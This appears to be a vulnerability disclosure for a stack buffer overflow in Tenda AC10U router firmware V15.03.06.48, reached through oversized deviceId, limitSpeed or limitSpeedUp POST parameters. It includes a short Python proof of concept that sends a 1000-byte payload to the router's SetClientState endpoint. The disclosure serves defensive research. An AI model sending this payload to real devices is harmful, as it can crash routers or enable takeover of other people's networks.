## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `formSetClientState` function. The `dev_id, dl_speed, ul_speed` variable receives the `deviceId, limitSpeed, limitSpeedUp` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `deviceId, limitSpeed, limitSpeedUp` can trigger this security vulnerability.

![image-20240313223551133](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313223551133.png)

![image-20240313223536867](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313223536867.png)

![image-20240313223924721](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313223924721.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetClientState"
payload = b"a"*1000

data = {'limitEn':1,"deviceId": payload}
# data = {'limitEn':1,"limitSpeed": payload}
# data = {'limitEn':1,"limitSpeedUp": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313223855498](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313223855498.png)
